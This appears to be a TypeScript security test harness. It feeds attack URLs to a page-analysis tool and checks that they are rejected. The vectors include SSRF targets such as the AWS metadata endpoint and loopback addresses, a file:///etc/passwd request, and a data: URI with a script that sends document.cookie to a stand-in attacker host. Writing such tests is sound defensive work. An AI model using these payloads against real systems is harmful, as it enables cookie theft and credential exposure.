import { analyzePage } from "../src/tools/analyze_page.js";
import { toClaude } from "../src/tools/to_claude.js";
import { toFigma } from "../src/tools/to_figma.js";
import { closeSharedContext } from "../src/lib/browser.js";

interface Vector {
  id: string;
  category: string;
  url: string;
  expect: "reject" | "extract_safe" | "timeout" | "error";
  notes: string;
}

const VECTORS: Vector[] = [
  {
    id: "scheme-javascript",
    category: "URL scheme injection",
    url: "javascript:alert(1)",
    expect: "reject",
    notes: "JavaScript scheme should be rejected by Zod URL or Playwright",
  },
  {
    id: "scheme-file",
    category: "URL scheme injection / SSRF",
    url: "file:///etc/passwd",
    expect: "reject",
    notes: "file:// scheme should be rejected to prevent local file disclosure",
  },
  {
    id: "scheme-data",
    category: "URL scheme injection",
    url: "data:text/html,<script>fetch('http://attacker.test/'+document.cookie)</script>",
    expect: "reject",
    notes: "data: URI with malicious script — urlGuard blocks scheme",
  },
  {
    id: "ssrf-localhost-brain",
    category: "SSRF",
    url: "http://127.0.0.1:8742/health",
    expect: "reject",
    notes: "SSRF Brain MCP — urlGuard blocks loopback",
  },
  {
    id: "ssrf-aws-metadata",
    category: "SSRF",
    url: "http://169.254.169.254/latest/meta-data/",
    expect: "reject",
    notes: "AWS metadata IMDS — urlGuard blocks link-local 169.254/16",
  },
  {
    id: "ssrf-link-local",
    category: "SSRF",
    url: "http://[::1]/",
    expect: "reject",
    notes: "IPv6 loopback — urlGuard blocks ::1",
  },
  {
    id: "redirect-loop",
    category: "DoS",
    url: "https://httpbin.org/redirect/100",
    expect: "timeout",
    notes: "100 redirect hops — should hit timeout, not crash",
  },
  {
    id: "huge-page",
    category: "Resource exhaustion",
    url: "https://httpbin.org/stream-bytes/10485760",
    expect: "extract_safe",
    notes: "10MB stream — should handle without OOM",
  },
  {
    id: "malformed-url",
    category: "Input validation",
    url: "not-a-url",
    expect: "reject",
    notes: "Plain string should be rejected by Zod .url()",
  },
  {
    id: "empty-url",
    category: "Input validation",
    url: "",
    expect: "reject",
    notes: "Empty string rejected",
  },
  {
    id: "unicode-bypass",
    category: "Input validation",
    url: "http://example.com/‮/malicious",
    expect: "extract_safe",
    notes: "Right-to-left override unicode — should not crash but logged",
  },
];

interface Result {
  vector: Vector;
  tool: string;
  outcome: "rejected_input" | "completed_ok" | "completed_with_warnings" | "timeout" | "error" | "unknown";
  detail: string;
  duration_ms: number;
}

const results: Result[] = [];

async function run(v: Vector, tool: string, fn: () => Promise<unknown>): Promise<void> {
  const t0 = Date.now();
  try {
    const r = (await fn()) as any;
    const warnings = r?.warnings ?? r?.bundle?.warnings ?? r?.document?.warnings ?? [];
    const warnCount = Array.isArray(warnings) ? warnings.length : 0;
    results.push({
      vector: v,
      tool,
      outcome: warnCount > 0 ? "completed_with_warnings" : "completed_ok",
      detail: warnCount > 0 ? `${warnCount} warnings` : "no warnings",
      duration_ms: Date.now() - t0,
    });
  } catch (e) {
    const msg = (e as Error).message;
    const isZod = msg.includes("ZodError") || msg.includes("Invalid url") || msg.includes("Invalid URL");
    const isTimeout = msg.includes("Timeout") || msg.includes("net::ERR");
    results.push({
      vector: v,
      tool,
      outcome: isZod ? "rejected_input" : isTimeout ? "timeout" : "error",
      detail: msg.slice(0, 200),
      duration_ms: Date.now() - t0,
    });
  }
}

console.error(`Running ${VECTORS.length} attack vectors x 1 tool = ${VECTORS.length} tests`);

try {
  for (const v of VECTORS) {
    console.error(`[${v.id}] ${v.category} : ${v.url.slice(0, 60)}`);
    await run(v, "analyze_page", () =>
      analyzePage({ url: v.url, outputs: ["a11y"], timeout_ms: 8000, cookie_consent: "skip", clear_cookies_after: true })
    );
  }
} finally {
  await closeSharedContext();
}

const summary = {
  total: results.length,
  by_outcome: results.reduce(
    (acc, r) => {
      acc[r.outcome] = (acc[r.outcome] || 0) + 1;
      return acc;
    },
    {} as Record<string, number>
  ),
  results: results.map((r) => ({
    id: r.vector.id,
    category: r.vector.category,
    url: r.vector.url.slice(0, 80),
    expected: r.vector.expect,
    actual: r.outcome,
    match: outcomeMatches(r.vector.expect, r.outcome),
    duration_ms: r.duration_ms,
    detail: r.detail.slice(0, 150),
  })),
};

function outcomeMatches(expected: Vector["expect"], actual: Result["outcome"]): boolean {
  if (expected === "reject") return actual === "rejected_input" || actual === "error";
  if (expected === "extract_safe") return actual === "completed_ok" || actual === "completed_with_warnings";
  if (expected === "timeout") return actual === "timeout";
  if (expected === "error") return actual === "error" || actual === "timeout";
  return false;
}

console.log(JSON.stringify(summary, null, 2));
process.exit(0);
